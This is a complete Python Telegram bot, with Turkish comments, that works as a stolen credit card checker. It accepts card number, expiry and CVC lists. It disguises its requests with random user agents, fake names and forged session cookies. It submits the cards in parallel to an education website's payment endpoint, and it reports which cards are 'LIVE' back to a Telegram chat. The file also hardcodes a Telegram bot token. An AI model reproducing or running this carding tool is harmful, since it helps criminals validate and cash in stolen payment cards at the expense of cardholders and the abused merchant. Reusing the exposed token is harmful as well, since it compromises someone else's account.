import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from faker import Faker
from fake_useragent import UserAgent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os

# Sabitler
TELEGRAM_TOKEN = "8290970736:AAFFPAHSfkE0mt6EaY-pwPYAsaBocHkhzkw"  # Telegram bot token
ua = UserAgent()
fake = Faker('tr_TR')

def send_telegram(message, chat_id):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": chat_id, "text": message}
        )
    except Exception as e:
        print(f"Telegram Hatası: {e}")

def generate_session_id():
    return ''.join(random.choices('0123456789abcdef', k=32))

def check_card(kartNo, kartAy, kartYil, kartCvc, chat_id):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': ua.random,
    }

    cookies = {
        'ASP.NET_SessionId': generate_session_id()
    }

    payload = {
        'KartNo': kartNo,
        'KartAd': fake.name(),
        'KartCvc': kartCvc,
        'KartAy': kartAy,
        'KartYil': kartYil[-2:] if len(kartYil) == 4 else kartYil,
        'Total': '1.00'
    }

    try:
        start_time = time.time()
        response = requests.post(
            'https://www.tongucakademi.com/uyelikpaketleri/getcardpoint',
            headers=headers,
            cookies=cookies,
            data=payload,
            timeout=15
        )
        elapsed_time = time.time() - start_time
        data = response.json()
    except Exception:
        return None

    duration_text = f"{round(elapsed_time, 3)} sn"

    if data.get('Durum') is True:
        puan = str(data.get('Data', {}).get('Amount', '0')).strip()
        if puan in ["0", "0.0"]:
            return None

        msg = f"✅ LIVE | {kartNo}|{kartAy}|{kartYil}|{kartCvc} | Puan: {puan} | Api by @quicax"
        send_telegram(msg, chat_id)
        return msg
    else:
        return f"❌ DECLINED | {kartNo}|{kartAy}|{kartYil}|{kartCvc} | {duration_text}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("QuarterCheck’e Hoşgeldin! 😎\n"
                                   "/txt - Kartları txt dosyasından kontrol et\n"
                                   "/check - Tek bir kartı kontrol et")

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    try:
        # Kullanıcıdan gelen mesajı al
        card_info = ' '.join(context.args)
        if not card_info:
            await update.message.reply_text("Lütfen kart bilgisini şu formatta gir: kartNo|kartAy|kartYil|kartCvc")
            return

        kartNo, kartAy, kartYil, kartCvc = map(str.strip, card_info.split("|"))
        if len(kartNo) < 16 or len(kartAy) != 2 or len(kartYil) not in [2, 4] or len(kartCvc) < 3:
            await update.message.reply_text("Geçersiz kart formatı! Örnek: 1234567890123456|12|25|123")
            return

        await update.message.reply_text("Kart kontrol ediliyor...")
        result = check_card(kartNo, kartAy, kartYil, kartCvc, chat_id)
        if result:
            await update.message.reply_text(result)
        else:
            await update.message.reply_text("Bir hata oluştu, tekrar dene.")
    except ValueError:
        await update.message.reply_text("Geçersiz format! Örnek: 1234567890123456|12|25|123")
    except Exception as e:
        await update.message.reply_text(f"Hata: {e}")

async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if not update.message.document:
        await update.message.reply_text("Lütfen bir .txt dosyası yükle!")
        return

    file = await update.message.document.get_file()
    file_name = update.message.document.file_name
    if not file_name.endswith('.txt'):
        await update.message.reply_text("Sadece .txt dosyaları destekleniyor!")
        return

    # Dosyayı indir
    file_path = f"temp_{chat_id}_{file_name}"
    await file.download_to_drive(file_path)

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            combos = [line.strip() for line in f if line.strip() and len(line.split("|")) == 4]
        
        if not combos:
            await update.message.reply_text("Dosya boş veya format hatalı!")
            os.remove(file_path)
            return

        await update.message.reply_text(f"{len(combos)} kart kontrol ediliyor...")

        THREAD_COUNT = 15
        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = []
            for line in combos:
                try:
                    kartNo, kartAy, kartYil, kartCvc = map(str.strip, line.split("|"))
                    futures.append(executor.submit(check_card, kartNo, kartAy, kartYil, kartCvc, chat_id))
                except ValueError:
                    await update.message.reply_text(f"Geçersiz format: {line}")

            for future in as_completed(futures):
                result = future.result()
                if result:
                    await update.message.reply_text(result)

        await update.message.reply_text("Kontrol tamamlandı!")
    except Exception as e:
        await update.message.reply_text(f"Hata: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    # Komutlar
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_txt))

    print("Bot başlatıldı...")
    app.run_polling()

if __name__ == '__main__':
    main()
